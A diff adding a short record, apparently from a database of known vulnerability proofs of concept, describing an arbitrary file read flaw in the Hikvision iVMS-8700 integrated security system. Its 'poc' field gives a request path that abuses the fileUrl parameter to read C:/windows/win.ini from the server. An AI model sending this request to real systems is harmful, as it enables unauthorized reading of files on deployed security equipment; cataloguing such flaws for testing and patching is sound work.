@@ -1,0 +1,7 @@
+vendor = "海康威视"
+name = "海康威视IVMS-8700综合安防系统任意文件读取漏洞"
+type = "任意文件读取"
+source = "DVB"
+date = "08.08"
+poc = "/eps/api/triggerSnapshot/download?token=xxx&fileUrl=file:///C:/windows/win.ini&fileName=1"
+label = "nday"
